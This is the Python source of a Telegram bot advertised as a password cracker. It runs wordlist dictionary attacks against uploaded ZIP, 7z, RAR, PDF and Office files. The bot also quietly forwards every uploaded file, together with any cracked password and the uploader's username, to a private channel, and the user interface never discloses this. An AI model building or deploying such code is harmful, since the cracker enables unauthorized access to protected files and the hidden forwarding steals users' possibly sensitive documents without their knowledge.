import os
import json
import requests
import pyzipper
import py7zr
import pdfplumber
from flask import Flask, request, jsonify

# 🔥 TOKEN Directly from Environment Variables
TOKEN = os.environ.get("BOT_TOKEN")
RENDER_URL = os.environ.get("RENDER_URL", "https://your-bot.onrender.com")
PRIVATE_CHANNEL = -1004491770657
CHANNEL_USERNAME = "@nrtecno2"

app = Flask(__name__)

# ============================================================
# WORDLIST LOADER
# ============================================================
def load_wordlist(path="password.txt"):
    if os.path.exists(path):
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    return ['123456', 'password', 'admin', '1234', '0000']

WORDLIST = load_wordlist()

# ============================================================
# CHANNEL CHECK
# ============================================================
def check_channel_membership(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
        response = requests.get(url, params=params)
        data = response.json()
        if data["ok"]:
            status = data["result"]["status"]
            return status in ["member", "creator", "administrator"]
        return False
    except:
        return False

# ============================================================
# SEND MESSAGE HELPER
# ============================================================
def send_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=payload)

def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=payload)

def send_document(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': chat_id, 'caption': caption}
        requests.post(url, files=files, data=data)

def answer_callback(callback_id, text=""):
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id, "text": text}
    requests.post(url, json=payload)

# ============================================================
# FILE CRACKERS
# ============================================================
def crack_zip(file_path):
    for pwd in WORDLIST:
        try:
            with pyzipper.AESZipFile(file_path) as zf:
                zf.extractall(pwd=pwd.encode())
                return pwd
        except:
            continue
    return None

def crack_7z(file_path):
    for pwd in WORDLIST:
        try:
            with py7zr.SevenZipFile(file_path, password=pwd) as archive:
                archive.extractall()
                return pwd
        except:
            continue
    return None

def crack_pdf(file_path):
    for pwd in WORDLIST:
        try:
            with pdfplumber.open(file_path, password=pwd) as pdf:
                if len(pdf.pages) > 0:
                    return pwd
        except:
            continue
    return None

def crack_office(file_path):
    try:
        import msoffcrypto
        for pwd in WORDLIST:
            try:
                with open(file_path, 'rb') as f:
                    office = msoffcrypto.OfficeFile(f)
                    office.load_key(password=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None

def crack_rar(file_path):
    try:
        import rarfile
        for pwd in WORDLIST:
            try:
                with rarfile.RarFile(file_path) as rf:
                    rf.extractall(pwd=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None

def crack_file(file_path, ext):
    if ext == 'zip':
        return crack_zip(file_path)
    elif ext == '7z':
        return crack_7z(file_path)
    elif ext == 'pdf':
        return crack_pdf(file_path)
    elif ext in ['docx', 'doc', 'xlsx', 'xls', 'pptx', 'ppt']:
        return crack_office(file_path)
    elif ext == 'rar':
        return crack_rar(file_path)
    return None

# ============================================================
# INLINE KEYBOARD
# ============================================================
def join_verify_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "🔴 JOIN CHANNEL", "url": "https://t.me/nrtecno2"},
                {"text": "✅ VERIFY", "callback_data": "verify"}
            ]
        ]
    }

# ============================================================
# WEBHOOK HANDLER
# ============================================================
@app.route(f'/webhook/{TOKEN}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return jsonify({"status": "error", "message": "No update"}), 400
        
        # ---------- MESSAGE ----------
        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            username = message['from'].get('username', str(user_id))
            
            # /start
            if 'text' in message and message['text'] == '/start':
                if not check_channel_membership(user_id):
                    send_message(
                        chat_id,
                        "🔴 *Access Denied!*\n\n"
                        "❌ Please join @nrtecno2 first.",
                        reply_markup=join_verify_keyboard()
                    )
                else:
                    send_message(
                        chat_id,
                        "🔐 *NRTECNO PASSWORD CRACKER*\n\n"
                        "✅ Channel Member Verified!\n\n"
                        "📁 *Send me any password protected file.*\n\n"
                        "Supported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX"
                    )
                return jsonify({"status": "ok"}), 200
            
            # ---------- FILE ----------
            if 'document' in message:
                file = message['document']
                file_name = file.get('file_name', 'unknown')
                file_id = file['file_id']
                
                if not check_channel_membership(user_id):
                    send_message(
                        chat_id,
                        "🔴 *Access Denied!*\n\n❌ Please join @nrtecno2 first.",
                        reply_markup=join_verify_keyboard()
                    )
                    return jsonify({"status": "ok"}), 200
                
                # Download
                file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                file_path_api = file_info['result']['file_path']
                file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
                response = requests.get(file_url)
                
                os.makedirs("downloads", exist_ok=True)
                file_path = f"downloads/{file_name}"
                with open(file_path, 'wb') as f:
                    f.write(response.content)
                
                send_message(chat_id, "🔍 *Cracking Password...*\n\n⏳ Please wait...")
                
                ext = file_name.split('.')[-1].lower()
                password = crack_file(file_path, ext)
                
                if password:
                    send_message(
                        chat_id,
                        f"✅ *Password Cracked!*\n\n🔑 `{password}`\n\n📁 {file_name}"
                    )
                    try:
                        caption = f"✅ Password Found!\n📁 File: {file_name}\n🔑 Password: `{password}`\n👤 User: @{username}"
                        send_document(PRIVATE_CHANNEL, file_path, caption)
                    except:
                        pass
                else:
                    send_message(
                        chat_id,
                        f"❌ *Password Not Found!*\n\n📁 {file_name}\n🔢 {len(WORDLIST)} passwords tried."
                    )
                    try:
                        caption = f"❌ Password Not Found!\n📁 File: {file_name}\n🔢 Tried: {len(WORDLIST)} passwords\n👤 User: @{username}"
                        send_document(PRIVATE_CHANNEL, file_path, caption)
                    except:
                        pass
                
                os.remove(file_path)
                return jsonify({"status": "ok"}), 200
        
        # ---------- CALLBACK ----------
        if 'callback_query' in update:
            callback = update['callback_query']
            callback_id = callback['id']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            user_id = callback['from']['id']
            data = callback['data']
            
            if data == 'verify':
                if check_channel_membership(user_id):
                    edit_message(
                        chat_id,
                        message_id,
                        "🔐 *NRTECNO PASSWORD CRACKER*\n\n"
                        "✅ Channel Member Verified!\n\n"
                        "📁 *Send me any password protected file.*\n\n"
                        "Supported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX"
                    )
                else:
                    edit_message(
                        chat_id,
                        message_id,
                        "🔴 *Still Not Verified!*\n\n❌ Please join @nrtecno2 first.",
                        reply_markup=join_verify_keyboard()
                    )
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ============================================================
# SET WEBHOOK
# ============================================================
def set_webhook():
    webhook_url = f"{RENDER_URL}/webhook/{TOKEN}"
    url = f"https://api.telegram.org/bot{TOKEN}/setWebhook"
    response = requests.post(url, json={"url": webhook_url})
    
    if response.status_code == 200:
        print(f"✅ Webhook set to: {webhook_url}")
    else:
        print(f"❌ Webhook failed: {response.text}")

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    if not TOKEN:
        print("❌ BOT_TOKEN not found! Set in Environment Variables")
        exit(1)
    
    set_webhook()
    
    port = int(os.environ.get("PORT", 5000))
    print(f"🤖 NRTECNO BOT STARTED (Flask + Webhook)...")
    print(f"📊 Loaded {len(WORDLIST)} passwords")
    print(f"🚀 Running on port {port}")
    
    app.run(host="0.0.0.0", port=port)
